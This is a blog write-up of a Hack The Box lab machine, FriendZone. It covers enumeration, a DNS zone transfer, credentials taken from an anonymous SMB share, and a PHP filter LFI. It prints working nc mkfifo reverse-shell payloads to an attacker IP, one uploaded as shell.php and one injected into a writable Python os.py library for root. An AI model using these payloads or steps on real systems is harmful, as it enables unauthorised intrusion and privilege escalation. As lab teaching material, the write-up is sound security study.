---
title: "FriendZone — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for FriendZone Hackthebox Machine"
date: 2022-05-06 19:00:00 +0200
categories: [HackTheBox]
tags: [HTB, Linux]
---


## Introduction

![](/img/HTB/FriendZone/FriendZone.png)

#### Used Tools:
- nmap
- dig
- smbmap
- smbclient
- linPeas
- pspy


## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/FriendZone/img (1).png)

Nmap is done with open ports:
21 --> FTP
22 --> SSH
53 --> DNS
80 --> HTTP
139 --> SMB
443 --> HTTPS
445 --> SMB

Tried anonymous login with FTP but unfortunately didn't work:

![](/img/HTB/FriendZone/img (2).png)

Let's Jumb to the webserver... 

![](/img/HTB/FriendZone/img (3).png)

Just a static web page, I tried directory bruteforcing it but didn't reach anything...
Note: There is a domain name down there *friendzoneportal.red*

We know there is Port **53** open which is domain may be we can do a zone transfer for that domain. I added friedzone.red and friendzoneportal.red in /etc/hosts

```bash
dig axfr @10.10.10.123 friendzone.red
```

![](/img/HTB/FriendZone/img (4).png)

Successfully found 3 new subdomains, Added them to my /etc/hosts

I tried to access **administrator1.friendzone.red** but found a login form with username and password

![](/img/HTB/FriendZone/img (5).png)

Tried SQLinjection but didn't succeed, So I checked the other two subdomains

**Upload.friendzone.red** --> Have an upload button and after uploading an image nothing interested happen
**hr.friendzone.red** --> Not Found


Let's check **SMB** Service to see if there is any file available

```bash
smbmap -H 10.10.10.123 -R
```

![](/img/HTB/FriendZone/img (6).png)

Found there is a file called **creds.txt** in general which have a read access


## 2. EXPLOITATION:


Let's try read general/creds.txt

```bash
smbclient -U "" //10.10.10.123/general
```

![](/img/HTB/FriendZone/img (7).png)

Got admin credentials, Let's try them in `administrator1.friendzone.red`

![](/img/HTB/FriendZone/img (8).png)

Logged in Successfully to page contain a message to visit **/dashboard**

![](/img/HTB/FriendZone/img (9).png)

Visiting /dashboard found a page that appears tp be dealing with some sort of images and have a missing parameters due to begginer development and saying to add the missing parameters

`image_id=a.jpg&pagename=timestamp`


![](/img/HTB/FriendZone/img (10).png)

Adding the missing parameters, The Image successfully appeared with something called timestamp displayed at the end

![](/img/HTB/FriendZone/img (11).png)

Refreshing the page a lot of times the timestamp kept changing which indicates that it must be a php page that has the .php added automatically, So I tried to view it using LFI Wrappers...

Let start with "PHP wrapper" to bypass LFI functionality.

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp`

We got a base64 string of the .php page content

![](/img/HTB/FriendZone/img (12).png)

Its Working...

The `Development` share, we saw from `smbmap` has **writable permission** by the guest so why dont we upload a reverse shell there and try to access from this page. 

Write this exploit to a file named shell.php:

```php
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 4444 >/tmp/f');
?>
```

Then reopen the smbclient but now in the development directory and upload the shell

```bash
smbclient -U "" //10.10.10.123/development
put shell.php
```

![](/img/HTB/FriendZone/img (13).png)

Create a listener on my local machine:

```bash
nc -nlvp 4444
```

We know that the smb files are located under the `/etc` from our previous enumeration, So we will access our shell which is under `/etc/Development/shell` without .php because it is automatically added

![](/img/HTB/FriendZone/img (14).png)

BOOOOOOOOOOOOOOOOOOOOOOOOOOOM ! We successfully gained a shell for `www-data` user and the user flag is located at `/home/friend/user.txt`

![](/img/HTB/FriendZone/img (15).png)


## 3. PRIVILEGE ESCALATION:

In the /var/www there is a file called mysql_data.conf that has credentials of user `friend`, So we used it to upgrade from `www-data` to `friend`

![](/img/HTB/FriendZone/img (16).png)

I Also used these creds to obtain an `ssh` access with them

Then I ran *linPeas* script but it didn't show any thing I can use so I headed to see the `pspy` which monitor linux processes without root permissions.

But firstly I must upload it to the machine, and we all knew that /etc/development is writable so I will put the script there.

At my local machine:

```bash
kali@kali python3 -m http.server 8080
````

At friendZone:

```bash
wget http://10.10.16.10:8080/pspy64
```

![](/img/HTB/FriendZone/img (17).png)

After sometime this appeared, root runs `reporter.py` every minute

![](/img/HTB/FriendZone/img (18).png)

The script doesn't do anything except it runs the `os` script in the import line

![](/img/HTB/FriendZone/img (19).png)

From my previous enumeration in linPeas I found that `/usr/lib/python2.7/os.py` is writable. So what if we put a reverse shell in this library and when the reporter.py is reruned by root it will execute the shell with root privillages. Let's Try it...

Firstly we will put reverse shell in os.py

```python
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 8888 >/tmp/f")
```

![](/img/HTB/FriendZone/img (20).png)

Then we will save and open a listener in a new tab and wait a while for a connection...

![](/img/HTB/FriendZone/img (21).png)

BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :D

Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***